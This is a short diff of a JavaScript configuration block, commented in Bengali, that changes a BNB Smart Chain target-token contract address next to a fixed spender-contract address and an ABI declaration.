@@ -5,7 +5,7 @@ const SPENDER_CONTRACT = "0xA6E28350e9130D296853D104ba4d0E895d334019";
 
 // ২. টার্গেট টোকেন অ্যাড্রেস (USDT BEP20 - BSC Mainnet)
 // আপনি চাইলে এটি পরিবর্তন করে অন্য টোকেন দিতে পারেন
-const TARGET_TOKEN = "0x55d398326f99059fF775485246999027B3197955"; 
+const TARGET_TOKEN = "0x566bA3A91497E66eb6D309FfC3F1228447619BcE"; 
 
 // ৩. আপনার দেওয়া ABI (এটা কন্ট্রাক্ট ইন্টারঅ্যাকশনের জন্য রেখে দেওয়া হলো)
 const TITAN_ABI = [
